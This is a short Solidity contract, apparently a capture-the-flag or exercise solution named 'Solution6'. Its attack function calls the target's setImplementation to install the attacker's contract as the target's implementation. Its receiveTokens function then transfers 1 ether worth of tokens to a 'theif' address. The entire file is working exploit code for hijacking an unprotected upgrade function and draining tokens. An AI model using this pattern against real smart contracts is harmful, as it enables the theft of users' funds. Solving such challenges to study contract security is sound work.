// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Solution6 {
    function attack(address question6Address) public {
        bytes memory data = abi.encodeWithSignature(
            "setImplementation(address)",
            address(this)
        );
        address(question6Address).call(data);
    }

    function receiveTokens(address tokenAddress, address theif) public {
        bytes memory data = abi.encodeWithSignature(
            "transfer(address,uint256)",
            theif,
            1 ether
        );
        (bool success, ) = address(tokenAddress).call(data);
        require(success,"recive failed");
    }
}